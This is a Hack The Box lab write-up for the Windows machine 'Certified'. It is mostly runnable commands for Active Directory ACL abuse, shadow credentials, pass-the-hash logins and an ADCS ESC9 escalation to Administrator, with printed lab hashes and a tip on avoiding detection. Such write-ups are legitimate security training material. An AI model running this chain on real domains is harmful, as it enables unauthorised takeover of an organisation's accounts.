# Certified — Hack The Box Writeup

| Field      | Value                                              |
|------------|----------------------------------------------------|
| Machine    | Certified                                          |
| OS         | Windows                                            |
| Difficulty | Medium                                             |
| Focus      | BloodHound ACL Abuse, Shadow Credentials, ADCS ESC9 |

---

## Summary

Certified is a medium Windows Active Directory machine. Starting with low-privileged credentials, we enumerate LDAP and BloodHound to discover an ACL abuse chain: WriteOwner on the Management group → GenericWrite on management_svc → GenericAll on ca_operator. We abuse shadow credentials to harvest NT hashes, then exploit an ESC9 ADCS misconfiguration by manipulating the UPN to impersonate Administrator and retrieve the root flag.

---

## Recon

### Nmap Scan

```bash
sudo nmap -sC -sV -p- --min-rate 10000 10.129.182.172 -oA nmap-out
```

**Open Ports:**

```
53    - DNS
88    - Kerberos
135   - MSRPC
139   - NetBIOS
389   - LDAP (Domain: certified.htb)
445   - SMB
464   - kpasswd5
593   - RPC over HTTP
636   - LDAPS
3268  - LDAP GC
3269  - LDAPS GC
5985  - WinRM
9389  - .NET Message Framing
```

Standard Domain Controller — no web server, no SQL. Note hostname: `DC01.certified.htb`

### Add Host Entry

```bash
echo "10.129.182.172 certified.htb DC01.certified.htb" | sudo tee -a /etc/hosts
```

---

## Enumeration

### Starting Credentials

```
judith.mader : judith09
```

### LDAP Dump

```bash
ldapdomaindump -u certified.htb\\judith.mader -p judith09 10.129.182.172 -o .
```

Users identified: `judith.mader`, `management_svc`, `ca_operator`, `administrator`

### BloodHound Collection

```bash
bloodhound-python -c ALL -u judith.mader -p judith09 -d certified.htb -dc certified.htb -ns 10.129.182.172
```

Upload the JSON files to BloodHound.

### ACL Abuse Chain Discovered

```
judith.mader  --WriteOwner-->  Management Group
Management    --GenericWrite-> management_svc
management_svc --GenericAll--> ca_operator
```

### Confirm ADCS

```bash
nxc ldap 10.129.182.172 -u judith.mader -p 'judith09' -M adcs
```

ADCS confirmed — ca_operator will be needed to enumerate vulnerable templates.

### Kerberoast Attempt (Failed)

```bash
impacket-GetUserSPNs -request -dc-ip 10.129.182.172 certified.htb/judith.mader -save -outputfile kerberoast-out
hashcat -m 13100 -a 0 kerberoast-out /usr/share/wordlists/rockyou.txt
```

Hash does not crack — pivot to ACL abuse instead.

---

## Exploitation

### Step 1 — Take Ownership of Management Group

```bash
impacket-owneredit -action write -new-owner 'judith.mader' \
  -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' \
  'certified.htb'/'judith.mader':'judith09' -dc-ip 10.129.182.172
```

### Step 2 — Grant WriteMembers to Judith

```bash
impacket-dacledit -action 'write' -rights 'WriteMembers' \
  -principal 'judith.mader' \
  -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' \
  'certified.htb'/'judith.mader':'judith09' -dc-ip 10.129.182.172
```

### Step 3 — Add Judith to Management Group

```bash
net rpc group addmem "MANAGEMENT" "judith.mader" \
  -U "certified.htb"/"judith.mader"%"judith09" -S 10.129.182.172
```

### Step 4 — Abuse Shadow Credentials on management_svc

Set up pywhisker in a virtual environment:

```bash
python3 -m venv cert
source venv/bin/activate
git clone https://github.com/ShutdownRepo/pywhisker.git
cd pywhisker && pip3 install -r requirements.txt
```

Check existing shadow credentials:

```bash
python3 pywhisker.py --action list -d certified.htb -u judith.mader \
  -p judith09 --dc-ip 10.129.182.172 -t management_svc
```

Add shadow credentials:

```bash
python3 pywhisker.py --action add -d certified.htb -u judith.mader \
  -p judith09 --dc-ip 10.129.182.172 -t management_svc
```

Note the generated `.pfx` filename and password from the output.

### Step 5 — Get TGT via PKINIT

```bash
git clone https://github.com/dirkjanm/PKINITtools
cd PKINITtools && pip3 install -r requirements.txt

python3 gettgtpkinit.py -cert-pfx ../9t2Ahj4Z.pfx -pfx-pass vy1ChB2p6Rfv1JxAbT6n \
  certified.htb/management_svc management_svc.ccache -dc-ip 10.129.182.172
```

### Step 6 — Extract NT Hash

```bash
export KRB5CCNAME=management_svc.ccache

python3 getnthash.py certified.htb/management_svc \
  -key 763a399ddfc5a617c3b785f46acb3eb7aac43f503b3f5bd7578b37ad615b4123
```

**management_svc NT hash:** `a091c1832bcdd4677c28b5a6a1295584`

### Step 7 — WinRM Access + User Flag

```bash
evil-winrm -i 10.129.182.172 -u management_svc -H 'a091c1832bcdd4677c28b5a6a1295584'
```

```
type desktop/user.txt
```

---

## Privilege Escalation

### Step 8 — Pivot to ca_operator via Shadow Credentials

```bash
certipy shadow auto \
  -username management_svc@certified.htb \
  -hashes 'a091c1832bcdd4677c28b5a6a1295584' \
  -account ca_operator
```

**ca_operator NT hash:** `b4b86f45c6018f1b664f70805f45d8f2`

### Step 9 — Find Vulnerable ADCS Templates

```bash
certipy find -u ca_operator -hashes 'b4b86f45c6018f1b664f70805f45d8f2' \
  -target certified.htb -text -stdout -vulnerable
```

**Vulnerable template:** `CertifiedAuthentication`  
**Vulnerability:** ESC9  
**Exploit:** Change ca_operator UPN to Administrator, request certificate, revert UPN, authenticate.

### Step 10 — ESC9 Exploitation

Change ca_operator UPN to Administrator:

```bash
certipy account update \
  -username management_svc@certified.htb \
  -hashes 'a091c1832bcdd4677c28b5a6a1295584' \
  -user ca_operator -upn Administrator
```

Request the vulnerable template:

```bash
certipy req -username ca_operator@certified.htb \
  -hashes 'b4b86f45c6018f1b664f70805f45d8f2' \
  -ca certified-DC01-CA -template CertifiedAuthentication
```

Revert UPN back:

```bash
certipy account update \
  -username management_svc@certified.htb \
  -hashes 'a091c1832bcdd4677c28b5a6a1295584' \
  -user ca_operator -upn ca_operator@certified.htb
```

Authenticate and retrieve Administrator hash:

```bash
certipy auth -pfx administrator.pfx -domain certified.htb
```

**Administrator NT hash:** `0d5b49608bbce1751f708748f67e2d34`

### Step 11 — Root Flag

```bash
evil-winrm -i 10.129.182.172 -u administrator -H '0d5b49608bbce1751f708748f67e2d34'
type C:\Users\Administrator\desktop\root.txt
```

---

## Attack Chain Summary

| Step | Action |
|------|--------|
| 1 | LDAP dump + BloodHound with judith.mader credentials |
| 2 | Discovered WriteOwner → GenericWrite → GenericAll chain |
| 3 | Took ownership of Management group, added Judith as member |
| 4 | Abused GenericWrite on management_svc via shadow credentials |
| 5 | Used PKINITtools to get TGT and extract NT hash |
| 6 | WinRM as management_svc — user flag |
| 7 | Abused GenericAll on ca_operator via certipy shadow |
| 8 | Found ESC9 vulnerable template with ca_operator |
| 9 | Changed UPN to Administrator, requested certificate, reverted |
| 10 | Authenticated with certificate — Administrator hash — root flag |

---

## Key Takeaways

- BloodHound ACL chains are critical to map before attempting exploitation.
- Shadow credentials abuse via pywhisker is a powerful alternative when Kerberoasting fails.
- ESC9 requires controlling the UPN of an enrolled account — GenericAll makes this trivial.
- Always revert UPN changes after ESC9 exploitation to avoid detection.
- Clock skew issues with Kerberos can be fixed with `ntpdate` or `faketime`.
